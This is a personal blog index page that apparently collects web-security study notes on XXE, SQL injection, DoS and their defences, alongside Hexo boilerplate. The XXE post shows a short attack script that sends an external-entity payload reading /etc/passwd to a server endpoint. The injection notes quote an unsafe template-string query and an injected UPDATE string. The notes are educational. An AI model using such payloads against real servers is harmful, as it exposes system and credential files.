<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>caketi</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="红凯">
<meta property="og:type" content="website">
<meta property="og:title" content="caketi">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="caketi">
<meta property="og:description" content="红凯">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="caketi">
<meta property="article:tag" content="红凯，乡秀树，北斗星司，东光太郎">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="caketi" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">caketi</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-test" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/20/test/" class="article-date">
  <time datetime="2020-09-20T02:13:55.456Z" itemprop="datePublished">2020-09-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/20/test/" data-id="ckfah5pfj000090th78452wbr" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-XXE-notes-intro-level" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/19/XXE-notes-intro-level/" class="article-date">
  <time datetime="2020-09-19T15:46:13.573Z" itemprop="datePublished">2020-09-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/19/XXE-notes-intro-level/">XXE-notes-intro-level</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <a id="more"></a>



<ul>
<li><strong><em>a classification of attack that is often very simple to execute, but with devastating results.Relies on improperly configured XML parser within an application’s code</em></strong></li>
<li>an API endpoint that accepts an XML payload</li>
<li><strong><em>XML-like formats include SVG, HTML/DOM, PDF(XPDF), and RTF</em></strong></li>
<li>magic behind — XML specification includes a special annotation for importing external files. This special directive, called an external entity, is interpreted on the machine on which the XML file is evaluated. <blockquote>
<p>This means that a spcially crafted XML payload sent to a server’s XML pareser could result in compromsing files in that servers’s file structure.</p>
</blockquote>
</li>
<li>used to compromise files from other users</li>
<li>access files like /etc/shadow – store important credentials required for a Univ-based server to function properly<h3 id="Direct-XXE"><a href="#Direct-XXE" class="headerlink" title="Direct XXE"></a>Direct XXE</h3>In direct XXE, an XML object is sent to the server with an external entity flag. It is<br>then parsed, and a result is returned that includes the external entity <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"> A simple button. Calls the <span class="function"><span class="keyword">function</span> `<span class="title">screenshot</span>(<span class="params"></span>)` <span class="title">when</span> <span class="title">clicked</span>.</span></span><br><span class="line"><span class="function"> --&gt;</span></span><br><span class="line"><span class="function">&lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">button</span>&quot;</span></span><br><span class="line"><span class="function"> <span class="title">id</span>=&quot;<span class="title">screenshot</span>-<span class="title">button</span>&quot;</span></span><br><span class="line"><span class="function"> <span class="title">onclick</span>=&quot;<span class="title">screenshot</span>(<span class="params"></span>)&quot;&gt;</span></span><br><span class="line"><span class="function"> <span class="title">Send</span> <span class="title">Screenshot</span> <span class="title">to</span> <span class="title">Support</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="function">/*</span></span><br><span class="line"><span class="function"> * <span class="title">Collect</span> <span class="title">HTML</span> <span class="title">DOM</span> <span class="title">from</span> <span class="title">the</span> `<span class="title">content</span>` <span class="title">element</span> <span class="title">and</span> <span class="title">invoke</span> <span class="title">an</span> <span class="title">XML</span></span></span><br><span class="line"><span class="function"> * <span class="title">parser</span> <span class="title">to</span> <span class="title">convert</span> <span class="title">the</span> <span class="title">DOM</span> <span class="title">text</span> <span class="title">to</span> <span class="title">XML</span>.</span></span><br><span class="line"><span class="function"> *</span></span><br><span class="line"><span class="function"> * <span class="title">Send</span> <span class="title">the</span> <span class="title">XML</span> <span class="title">over</span> <span class="title">HTTP</span> <span class="title">to</span> <span class="title">a</span> <span class="title">function</span> <span class="title">that</span> <span class="title">will</span> <span class="title">generate</span> <span class="title">a</span> <span class="title">screenshot</span></span></span><br><span class="line"><span class="function"> * <span class="title">from</span> <span class="title">the</span> <span class="title">provided</span> <span class="title">XML</span>.</span></span><br><span class="line"><span class="function"> *</span></span><br><span class="line"><span class="function"> * <span class="title">Send</span> <span class="title">the</span> <span class="title">screenshot</span> <span class="title">to</span> <span class="title">support</span> <span class="title">staff</span> <span class="title">for</span> <span class="title">further</span> <span class="title">analysis</span>.</span></span><br><span class="line"><span class="function"> */</span></span><br><span class="line"><span class="function"><span class="title">const</span> <span class="title">screenshot</span> = <span class="title">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to convert the `content` element to XML.</span></span><br><span class="line"><span class="comment"> * Catch if this process fails—generally this should succeed</span></span><br><span class="line"><span class="comment"> * because HTML is a subset of XML.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">const</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;content&#x27;</span>).innerHTML;</span><br><span class="line"> <span class="keyword">const</span> serializer = <span class="keyword">new</span> XMLSerializer();</span><br><span class="line"> <span class="keyword">const</span> dom = serializer.serializeToString(div);</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Once the DOM has been converted to XML, generate a request to</span></span><br><span class="line"><span class="comment"> * an endpoint that will convert the XML to an image. Hence</span></span><br><span class="line"><span class="comment">142 | Chapter 12: XML External Entity (XXE)</span></span><br><span class="line"><span class="comment"> * resulting in a screenshot.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">const</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"> <span class="keyword">const</span> url = <span class="string">&#x27;https://util.mega-bank.com/screenshot&#x27;</span>;</span><br><span class="line"> <span class="keyword">const</span> data = <span class="keyword">new</span> FormData();</span><br><span class="line"> data.append(<span class="string">&#x27;dom&#x27;</span>, dom);</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the conversion of XML -&gt; image is successful,</span></span><br><span class="line"><span class="comment"> * send the screenshot to support for analysis.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Else alert the user the process failed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> sendScreenshotToSupport(xhr.responseText, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (err) &#123; alert(<span class="string">&#x27;could not send screenshot.&#x27;</span>) &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123; alert(<span class="string">&#x27;screenshot sent to support!&#x27;</span>); &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"> xhr.send(data);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Warn the user if their browser is not compatible with this feature.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> alert(Your browser does not support <span class="built_in">this</span> functionality. Consider upgrading.</span><br><span class="line"> );</span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<ol>
<li>The browser converts the current user’s view (via the DOM) to XML.</li>
<li>The browser sends this XML to a service which converts it to a JPG.</li>
<li>The browser sends that JPG to a member of MegaBank support via another API.</li>
</ol>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmltojpg <span class="keyword">from</span> <span class="string">&#x27;./xmltojpg&#x27;</span></span><br><span class="line"><span class="comment">/*Convert an XML to a JPG image.</span></span><br><span class="line"><span class="comment"> *Return the image data to the requester</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">app.post(<span class="string">&#x27;/screenshot&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.body.dom) &#123; <span class="keyword">return</span> res.sendStatus(<span class="number">400</span>)&#125;</span><br><span class="line">    xmltojpg.convert(req.body.dom)</span><br><span class="line">    .then(<span class="function">(<span class="params">err, jpg</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) &#123;<span class="keyword">return</span> res.sendStatus(<span class="number">400</span>)&#125;</span><br><span class="line">        <span class="keyword">return</span> res.send(jpg)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>To convert the XML file to a JPG file, it must go through an XML parser. To be a valid<br>XML parser, it must follow the XML spec.</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> utilAPI <span class="keyword">from</span> <span class="string">&#x27;./utilAPI&#x27;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Generate a new XML HTTP request targeting the XML -&gt; JPG utility API.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">xhr.open(<span class="string">&#x27;POST&#x27;</span>, utilAPI.url + <span class="string">&#x27;/screenshot&#x27;</span>)</span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Provide a manually crafted XML string hat makes use of the external entity functionality in many XML parsers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> rawXMLString = <span class="string">&#x27;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;xxe;&lt;/xxe&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === XMLHttpRequest.DONE &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="comment">// chekc response data here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// send the request to the XML -&gt; JPG utility API endpoint</span></span><br><span class="line">xhr.send(rawXMLString)</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/19/XXE-notes-intro-level/" data-id="ckfah5pjr000b90th2y7g03wq" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-GitHub host配置" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/19/GitHub%20host%E9%85%8D%E7%BD%AE/" class="article-date">
  <time datetime="2020-09-19T15:00:39.637Z" itemprop="datePublished">2020-09-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/19/GitHub%20host%E9%85%8D%E7%BD%AE/">Github host 配置</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>修改本地的hosts文件，建立对github的解析：</p>
<p>C:\Windows\System32\drivers\etc\hosts</p>
<p>添加：</p>
<p>　　IP　　<a target="_blank" rel="noopener" href="https://www.github.com/">https://www.github.com</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/19/GitHub%20host%E9%85%8D%E7%BD%AE/" data-id="ckfah5pjn000690th2ujtgewy" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Caketi-on-the-way" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/19/Caketi-on-the-way/" class="article-date">
  <time datetime="2020-09-19T13:29:19.075Z" itemprop="datePublished">2020-09-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/19/Caketi-on-the-way/">Caketi  on the way</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>进来看看？</p>
        
          <p class="article-more-link">
            <a href="/2020/09/19/Caketi-on-the-way/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/19/Caketi-on-the-way/" data-id="ckfah5pg4000190th782q63qy" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/19/hello-world/" class="article-date">
  <time datetime="2020-09-19T13:15:17.187Z" itemprop="datePublished">2020-09-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/19/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/19/hello-world/" data-id="ckfah5pjt000d90th59970fe2" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-defending Dos" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/18/defending%20Dos/" class="article-date">
  <time datetime="2020-09-18T11:35:17.341Z" itemprop="datePublished">2020-09-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/18/defending%20Dos/">Defending DoS</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <a id="more"></a>

<blockquote>
<p>As such, a first measure against DoS-style attacks should be building up a compre‐<br>hensive enough logging system in your server that all requests are logged alongside<br>their time to respond.<br>#Proteting Against Regex DoS<br>With a proper code review process, you can prevent regex DoS sinks (evil or mali‐<br>cious regex) from ever entering your codebase.</p>
</blockquote>
<p>DoS attacks come via two major archetypes: single attacker (DoS) and multiple<br>attackers (DDoS).<br>Most, but not all, DDoS attacks are performed by overwhelming server resources<br>rather than via bug exploitation. Because of this, countermeasures for DDoS may also<br>cause difficulty for legitimate users</p>
<p>Single-attacker DoS attacks, on the other hand, can be mitigated by smart application<br>architecture that prevents users from being able to take over application resources for<br>a long period of time.<br>Regular-expression-based DoS attacks can be mitigated by implementing a static<br>analysis tool (like a linter) to scan regular expressions in your codebase and warn if<br>any appear to be “evil” syntactically.<br>Because of their general ease of exploitation, DoS-style attacks are rampant through‐<br>out the web. Even if you don’t expect your application to be a target of DoS attacks,<br>you should implement anti-DoS mitigations once you can afford it just in case you<br>become a target in the future.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/18/defending%20Dos/" data-id="ckfah5pjt000c90thbi7i8qmx" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Defending Against  Injection" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/18/Defending%20Against%20%20Injection/" class="article-date">
  <time datetime="2020-09-18T11:06:52.239Z" itemprop="datePublished">2020-09-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/18/Defending%20Against%20%20Injection/">Defending Against Injection</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <a id="more"></a>
<blockquote>
<p>In most modern web applications, SQL operations would occur past the server-side<br>routing level. This means we aren’t too interested in anything on the client.<br><strong><em>Remember that if data is persisting between devices and sessions, it is<br>either stored in server-side memory, disk (logs), or in a database.</em></strong><br>Furthermore, some server software makes use of a domain-specific language (DSL),<br>which could potentially make SQL calls on our behalf, although these calls would not<br>be structured similarly to a raw SQL call.</p>
</blockquote>
<p>If the SQL library is imported on a permodule basis, finding queries becomes as easy as searching for the import:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sql = <span class="built_in">require</span>(<span class="string">&#x27;mssql&#x27;</span>)</span><br><span class="line"><span class="comment">// OR</span></span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong><em>On the other hand, if these libraries are declared globally, or inherited from a parent<br>class, the work for finding queries becomes a bit more difficult.</em></strong><br>Both of the two aforementioned SQL adapters for Node.js use a syntax that concludes<br>with a call to .query(x), but some adapters use a more literal syntax:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sql = <span class="built_in">require</span>(<span class="string">&#x27;sql&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> getUserByUsername = <span class="function"><span class="keyword">function</span>(<span class="params">username</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">const</span> q = <span class="keyword">new</span> sql();</span><br><span class="line"> q.select(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line"> q.from(<span class="string">&#x27;users&#x27;</span>);</span><br><span class="line"> q.where(<span class="string">`username = <span class="subst">$&#123;username&#125;</span>`</span>);</span><br><span class="line"> q.then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">`username is : <span class="subst">$&#123;res&#125;</span>`</span>;</span><br><span class="line"> &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Prepared statements work by compiling the query first, with placeholder values for<br>variables. These are known as bind variables, but are often just referred to as place‐<br>holder variables. After compiling the query, the placeholders are replaced with the<br>values provided by the developer. As a result of this two-step process, the intention of<br>the query is set before any user-submitted data is considered.<br>With a prepared statement, because the intention is set in stone prior to the usersubmitted data being presented to the SQL interpreter, the query itself cannot change.<br>This means that a SELECT operation against users cannot be escaped and modified<br>into a DELETE operation by any means. An additional query cannot occur after the<br>SELECT operation if the user escapes the original query and begins a new one. Pre‐<br>pared statements eliminate most SQL injection risk and are supported by almost<br>every major SQL database: MySQL, Oracle, PostgreSQL, Microsoft SQL Server, etc.<br>The only major trade-off between traditional SQL queries and prepared statements is<br>that of performance. Rather than one trip to the database, the database is provided<br>the prepared statement followed by the variables to inject after compilation and at<br>runtime of the query. In most applications, this performance loss will be minimal.</p>
</blockquote>
<p>In MySQL, prepared statements are quite simple:<br>PREPARE q FROM ‘SELECT name, barCode from products WHERE price &lt;= ?’;<br>SET @price = 12;<br>EXECUTE q USING @price;<br>DEALLOCATE PREPARE q;<br>In this prepared statement, we are querying the MySQL database for products (we<br>want name and barcode returned) that have a price less than ?.<br>First, we use the statement PREPARE to store our query under the name q. This query<br>will be compiled and ready for use. Next, we set a variable @price to 12. This would<br>be a good variable to have a user set if they were filtering against an ecommerce site,<br>for example. Then we EXCECUTE the query providing @price to fill the ? placeholder/<br>bind variable. Finally, we use DEALLOCATE on q to remove it from memory so its<br>namespace can be used for other things.<br>In this simple prepared statement, q is compiled prior to being executed with @price.<br>Even if @price was set equal to 5; UPDATE users WHERE id = 123 SET balance =<br>10000, the additional query would not fire as it would not be compiled by the data‐<br>base.<br>Oracle (Java) offers an encoder that can be invoked with the following syntax:<br>ESAPI.encoder().enodeForSQL(new OracleCodec(), str);<br>Similarly, MySQL offers equivalent functionality. In MySQL, the following can be<br>used to prevent the usage of improperly escaped strings:<br>SELECT QUOTE(‘test’’case’);<br>The QUOTE function in MySQL will escape backslashes, single quotes, or NULL, and<br>return a properly single-quoted string.<br>MySQL also offers mysql_real_escape_string(). This function escapes all of the<br>preceding backslashes and single quotes, but also escapes double quotes, \n, and \r<br>(linebreak).<br>Making use of database-specific string sanitizers for escaping risky character sets<br>reduces the SQL injection risk by making it harder to write an SQL literal versus a<br>string. These should always be used if a query is being run that cannot be paramater‐<br>ized—though they should not be considered a comprehensive defense but instead a<br>mitigation.</p>
<p>It extends across any type of script that takes text input and<br>interprets the text in some type of interpreter or evaluates the text against some list of<br>commands.</p>
<p>Typically, when on the lookout for injection, the following are high-risk targets:<br>• Task schedulers<br>• Compression/optimization libraries<br>• Remote backup scripts<br>• Databases<br>• Loggers<br>• Any call to the HOST OS<br>• Any interpreter or compiler<br>When first ranking components </p>
<blockquote>
</blockquote>
<p>The principle of least authority (often called principle of least privilege, which I believe<br>to be a bit less succinct) is an important abstraction rule that should always be used<br>when attempting to build secure web applications. The principle states that in any<br>system, each member of the system should only have access to the information and<br>resources required to accomplish their job</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/18/Defending%20Against%20%20Injection/" data-id="ckfah5pje000290th8piz24j1" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Defending Against XXE" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/18/Defending%20Against%20XXE/" class="article-date">
  <time datetime="2020-09-18T08:37:59.309Z" itemprop="datePublished">2020-09-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/18/Defending%20Against%20XXE/">Defending Against XXE</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <a id="more"></a>
<p>Generally speaking, XXE is indeed easy to defend against—simply disable external<br>entities in your XML parser (see Figure 24-1). How this is done depends on the XML<br>parser in question, but is typically just a single line of configuration:<br>factory.setFeature(“<a target="_blank" rel="noopener" href="http://apache.org/xml/features/disallow-doctype-decl&quot;">http://apache.org/xml/features/disallow-doctype-decl&quot;</a>, true);</p>
<p>#XML versus JSON<br>Category| XML| JSON<br>—-| —-| —-<br>Payload size | Large |Compact<br>Specication complexity| High| Low<br>Ease of use| Requires complex parsing |Simple parsing for JavaScript compatibility<br>Metadata support| Yes| No<br>Rendering (via HTML-like structuring) |Easy |Difficult<br>Mixed content |Supported| Unsupported<br>Schema validation |Supported |Unsupported<br>Object mapping |None |JavaScript<br>Readability| Low |High<br>Comment support| Yes| No<br>Security| Lower| Higher</p>
<ul>
<li>JSON is a much more lightweight format than XML.</li>
<li>JSON offers less rigidity, but brings with it faster and easier to work withpayloads.</li>
<li>JSON maps to JavaScript objects, while XML more closely maps to DOM trees<br>(as the DOM is an XML-derived format).<blockquote>
<p>Because XML has schema validation, it may also be useful for applications where<br>deeply rigid data structure is required. JSON, on the other hand, is less rigid, making<br>it perfect for APIs with ongoing development such that the contract between the cli‐<br>ent and server does not need constant maintenance.<br>The security risks from XML mostly come from the power of its specification and the<br>fact that it can incorporate external files and multimedia. As such, it is naturally less<br>secure than JSON, a format that simply stores key/value pairs in a string-based<br>format.<br>If your organization does not like the idea of moving to JSON, YAML, BSON, or<br>EDN are all suitable alternatives but should require a similar analysis prior to<br>commitment.<br>#Advanced XXE Risks<br>It should be noted that XXE attacks often start as read-only attacks, but may progress<br>into more advanced forms of attack. XXE is a “gateway” attack of sorts as it provides<br>the attacker with a recon platform that permits them to access data otherwise unac‐<br>cessible to the world outside of the web server.<br>Using this data, other parts of the application may be more easily compromised. The<br>result is that the final impact of an XXE attack can be anywhere from read-only data<br>access to remote code execution and full server takeovers. This is why XXE attacks<br>are so incredibly dangerous</p>
</blockquote>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/18/Defending%20Against%20XXE/" data-id="ckfah5pjm000590th8cnl0o1k" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Defending Against CSRF Attacks" class="article article-type-post" itemscope itemprop="blogPost">
